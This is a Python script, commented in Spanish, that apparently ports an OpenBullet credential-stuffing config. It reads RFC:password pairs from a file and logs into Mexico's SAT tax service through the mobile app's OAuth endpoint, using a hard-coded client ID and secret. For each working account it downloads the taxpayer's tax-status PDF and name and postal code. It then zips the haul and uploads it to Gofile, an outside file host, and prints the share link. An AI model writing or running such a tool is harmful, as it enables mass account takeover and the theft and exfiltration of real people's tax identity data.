import requests
import base64
import os
import zipfile
import re

# Datos de la App
C_ID = "fe7bad7c-6dea-4834-8f40-1fa99620613b"
C_SEC = "vhHgI-1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYHOlo6Fb9pnLXZNWwuGnUj-zijmumfWOGUhlaLer8LACwNA"

def limpiar_texto(texto):
    return re.sub(r'[^\x20-\x7E]', '', texto).strip()

def run():
    if not os.path.exists("usuarios.txt"):
        print("? No existe usuarios.txt")
        return

    os.makedirs("PDFS_SAT", exist_ok=True)
    reporte = "=== REPORTE SAT ===\n\n"
    
    with open("usuarios.txt", "r", encoding="utf-8", errors="ignore") as f:
        lineas = f.readlines()

    session = requests.Session()

    for linea in lineas:
        linea = linea.strip()
        if not linea or ":" not in linea: continue
        
        partes = linea.split(":", 1)
        rfc = limpiar_texto(partes[0]).upper()
        pwd = partes[1].strip()
        if len(rfc) < 12: continue

        print(f"?? Procesando: {rfc}")

        # URL EXACTA COMO EN TU OPENBULLET
        # Pegamos todo en la URL porque el SAT así lo requiere para validar el 'client'
        token_url = (
            f"https://login.cloudb.sat.gob.mx/nidp/oauth/nam/token?"
            f"grant_type=password&client_id={C_ID}&client_secret={C_SEC}"
            f"&username={rfc}&password={pwd}&scope=satmovil&resourceServer=satmovil"
        )
        
        headers_login = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            # Enviamos CONTENT @"" (vacío) como en tu script original
            r_auth = session.post(token_url, data="", headers=headers_login, timeout=20)
            
            if r_auth.status_code != 200:
                print(f"  [!] Error {r_auth.status_code}: {r_auth.text}")
                continue
                
            token = r_auth.json().get("access_token")
            if not token: continue

            # HEADERS PARA LA API (DART/3.5 como en tu script)
            headers_api = {
                "Authorization": f"bearer {token}",
                "User-Agent": "Dart/3.5 (dart:io)",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json; charset=UTF-8; content=text/html;"
            }

            # 2. PDF
            res_pdf = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/csf/{rfc}", headers=headers_api, timeout=20)
            if res_pdf.status_code == 200:
                pdf_b64 = res_pdf.json().get("constancia")
                if pdf_b64:
                    with open(f"PDFS_SAT/{rfc}.pdf", "wb") as f_pdf:
                        f_pdf.write(base64.b64decode(pdf_b64))
                    print(f"  [+] PDF guardado")

            # 3. INFO
            res_info = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/dwh/miinformacion/{rfc}", headers=headers_api, timeout=20)
            if res_info.status_code == 200:
                info = res_info.json()
                reporte += f"RFC: {rfc} | NOMBRE: {info.get('tradename')} | CP: {info.get('zipcode')}\n"
                print(f"  [+] Info capturada")

        except Exception as e:
            print(f"  [!] Error: {str(e)}")

    # 4. COMPRESIÓN Y SUBIDA
    if os.listdir("PDFS_SAT"):
        with open("CAPTURAS.txt", "w", encoding="utf-8") as f_rep:
            f_rep.write(reporte)

        with zipfile.ZipFile("TODO_SAT.zip", 'w') as zipf:
            zipf.write("CAPTURAS.txt")
            for f in os.listdir("PDFS_SAT"):
                zipf.write(f"PDFS_SAT/{f}", f)

        # Gofile
        try:
            srv = requests.get("https://api.gofile.io/servers").json()["data"]["servers"][0]["name"]
            with open("TODO_SAT.zip", "rb") as fz:
                up = requests.post(f"https://{srv}.gofile.io/contents/uploadfile", files={"file": fz}).json()
            print(f"\n? ENLACE: {up['data']['downloadPage']}")
        except:
            print("? Error al subir a Gofile")
    else:
        print("? No se descargó nada.")

if __name__ == "__main__":
    run()
